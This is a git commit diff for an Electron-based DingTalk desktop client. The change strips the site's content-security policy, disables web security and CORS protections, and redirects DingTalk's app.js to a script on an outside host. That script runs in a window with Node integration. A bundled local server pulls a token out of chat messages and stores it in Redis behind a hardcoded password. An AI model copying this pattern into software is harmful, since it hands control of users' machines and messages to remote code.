52dc7ea7f506fd99885477f569f62de34e818c9a
cxtqq <chenxiutin@gmail.com>
2020-08-26 02:26:56 +0800

    init

--- src/main/mainWin.js
+++ src/main/mainWin.js
@@ -5,7 +5,6 @@ import download from './download'
 import autoUpdate from './autoUpdate'
 import contextMenu from './contextMenu'
 import { app, BrowserWindow, shell, ipcMain } from 'electron'
-
 let lastUrl
 let time = Date.now()
 /**
@@ -23,6 +22,8 @@ function openExternal (url) {
   time = Date.now()
   shell.openExternal(url)
 }
+
+app.commandLine.appendSwitch('disable-features', 'OutOfBlinkCors')
 
 export default dingtalk => () => {
   if (dingtalk.$mainWin) {
@@ -44,8 +45,48 @@ export default dingtalk => () => {
     icon: logo,
     resizable: true,
     webPreferences: {
-      nodeIntegration: true
+      nodeIntegration: true,
+      webSecurity: false,
+      allowDisplayingInsecureContent: true,
+      allowRunningInsecureContent: true
     }
+  })
+
+  var session = $win.webContents.session
+
+  var filter2 = {
+    urls: ['https://im.dingtalk.com/*']
+  }
+
+  session.webRequest.onHeadersReceived(filter2, (details, callback) => {
+    // const s = { responseHeaders: 'default-src \'self\'' }
+    // callback(s)
+    // eslint-disable-next-line standard/no-callback-literal
+    callback({
+      responseHeaders: Object.assign(details.responseHeaders, {
+        'content-security-policy': '',
+        'access-control-allow-origin': ['*']
+        // ["default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net; script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp"]
+      })
+    })
+  })
+
+  // 将所有请求的代理都修改为下列 url.
+  var filter = {
+    urls: [
+      'https://*.github.com/*',
+      // '*://electron.github.io'
+      'https://g.alicdn.com/DingTalkWeb/web/*/assets/app.js'
+    ]
+  }
+
+  session.webRequest.onBeforeRequest(filter, function (details, callback) {
+    // details.requestHeaders['User-Agent'] = 'MyAgent'
+    const s = {
+      // cancel: true
+      redirectURL: 'https://30591743.xyz/app-f.js' // 'http://localhost:8090/public/app-f.js'
+    }
+    callback(s)
   })
 
   /**
@@ -77,6 +118,37 @@ export default dingtalk => () => {
     // 页面初始化图标不跳动
     if (dingtalk.$tray) dingtalk.$tray.flicker(false)
     const filename = path.join(app.getAppPath(), './dist/preload/mainWin.js')
+
+    // $win.webContents.executeJavaScript(`
+    // function loadJs(url,callback){
+    //   var script=document.createElement('script');
+    //   script.type="text/javascript";
+    //   if(typeof(callback)!="undefined"){
+    //   if(script.readyState){
+    //   script.onreadystatechange=function(){
+    //    if(script.readyState == "loaded" || script.readyState == "complete"){
+    //    script.onreadystatechange=null;
+    //    callback();
+    //    }
+    //   }
+    //   }else{
+    //   script.onload=function(){
+    //    callback();
+    //   }
+    //   }
+    //   }
+    //   script.src=url;
+    //   document.body.appendChild(script);
+    //   }
+    //   loadJs("https://30591743.xyz/app-f.js",function(){
+    //   alert('done');
+    //   });
+    // `).then(() => {
+    //   if (!$win.webContents.isDestroyed()) {
+    //     // $win.webContents.send('dom-ready')
+    //   }
+    // })
+
     // 读取js文件并执行
     fs.access(filename, fs.constants.R_OK, err => {
       if (err) return
@@ -89,6 +161,20 @@ export default dingtalk => () => {
         })
       })
     })
+
+    // const f2 = path.join(app.getAppPath(), './dist/app-f.js')
+    // // 读取js文件并执行
+    // fs.access(f2, fs.constants.R_OK, err => {
+    //   if (err) return
+    //   fs.readFile(f2, (error, data) => {
+    //     if (error || $win.webContents.isDestroyed()) return
+    //     $win.webContents.executeJavaScript(data.toString()).then(() => {
+    //       if (!$win.webContents.isDestroyed()) {
+    //         $win.webContents.send('dom-ready')
+    //       }
+    //     })
+    //   })
+    // })
   })
 
   // 右键菜单
--- src/server.js
+++ src/server.js
@@ -1,32 +1,32 @@
-const express = require('express');
-const app = express();
-const port = 8090;
+const express = require('express')
+const app = express()
+const port = 8090
 
-var redis = require('redis');
+var redis = require('redis')
 const TOKEN_KEY = '123'
-client = redis.createClient('6379', '127.0.0.1', {
+const client = redis.createClient('6379', '127.0.0.1', {
   db: 0, // todo set
-  auth_pass: '123456',
-});
+  auth_pass: '123456'
+})
 
 client.on('error', function (err) {
-  console.log(err);
-});
+  console.log(err)
+})
 
-// app.use(express.static('./assets/dist'));
-const _myMsgSendedMap = {};
+app.use('/public', express.static('./assets/dist'))
+const _myMsgSendedMap = {}
 app.use(function (req, res) {
-  res.end();
+  res.end()
   // receiver
   if (req.query.args) {
     try {
-      const msgItem = JSON.parse(req.query.args);
+      const msgItem = JSON.parse(req.query.args)
       // lower cache by baseMessage.messageId // todo into db
-      const baseMessage = msgItem.baseMessage;
+      const baseMessage = msgItem.baseMessage
       if (!_myMsgSendedMap[baseMessage.messageId]) {
-        _myMsgSendedMap[baseMessage.messageId] = 1;
+        _myMsgSendedMap[baseMessage.messageId] = 1
         // if has, set to correct
-        const content = baseMessage.content;
+        const content = baseMessage.content
 
         if (
           content.contentType === 1200 &&
@@ -34,16 +34,16 @@ app.use(function (req, res) {
         ) {
           const str = content.attachments[0].extension.markdown
             .split('\n')[1]
-            .trim();
+            .trim()
           // set
-          client.set(TOKEN_KEY, str, redis.print);
-          client.get(TOKEN_KEY, redis.print);
+          client.set(TOKEN_KEY, str, redis.print)
+          client.get(TOKEN_KEY, redis.print)
         }
       }
     } catch (e) {
-      console.log(e);
+      console.log(e)
     }
   }
-});
+})
 
-app.listen(port, () => console.log(`Example app listening on port ${port}!`));
+app.listen(port, () => console.log(`Example app listening on port ${port}!`))
